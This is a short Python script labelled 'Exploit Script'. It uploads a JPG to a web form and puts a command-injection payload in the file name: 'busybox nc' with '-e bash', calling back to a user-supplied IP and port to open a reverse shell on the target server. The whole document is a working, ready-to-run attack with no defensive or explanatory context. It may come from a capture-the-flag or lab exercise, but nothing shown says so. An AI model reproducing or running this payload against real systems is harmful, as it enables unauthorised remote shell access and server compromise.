#!/usr/bin/env python3
import argparse
import requests
from pathlib import Path
import sys


parser = argparse.ArgumentParser(
	description="Exploit Script"
    )

parser.add_argument(
	"image",
	help="Path to JPG image file"
        )
  
parser.add_argument(
	"url",
	help="full url of the upload form"
        )

parser.add_argument(
	"ip",
	help="IP address to call back too"
        )
parser.add_argument(
	"port",
	help="Port to call back too"
        )
args = parser.parse_args()

filename = f"busybox nc {args.ip} {args.port} -e bash | bash |"

with open(args.image,"rb") as f:
    files = {
        "image": (filename, f, "image/jpeg")
    }

    data = {
        "upload": "Upload"
    }

    r = requests.post(args.url, files=files, data=data)




